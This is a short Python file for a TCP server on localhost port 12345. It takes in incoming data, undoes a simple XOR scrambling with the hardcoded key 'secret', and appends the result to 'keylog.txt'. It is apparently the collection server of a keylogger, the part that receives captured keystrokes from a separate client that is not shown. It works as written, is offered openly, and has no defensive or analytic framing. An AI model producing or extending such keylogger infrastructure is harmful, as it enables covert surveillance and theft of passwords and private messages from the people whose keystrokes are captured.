import socket

def decrypt(data, key="secret"):
    """Decrypt data using XOR with the given key."""
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ ord(key[i % len(key)]))
    return result.decode('utf-8', errors='replace')

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('127.0.0.1', 12345))
    server_socket.listen(1)
    print("Server listening on 127.0.0.1:12345...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")
        
        data = client_socket.recv(4096)  # Buffer size of 4KB
        if data:
            decrypted = decrypt(data)
            print("Decrypted data:", decrypted)
            
            # Append decrypted data to keylog.txt
            with open("keylog.txt", "a", encoding="utf-8") as log_file:
                log_file.write(decrypted)
        
        client_socket.close()

if __name__ == "__main__":
    try:
        start_server()
    except KeyboardInterrupt:
        print("\nServer stopped.")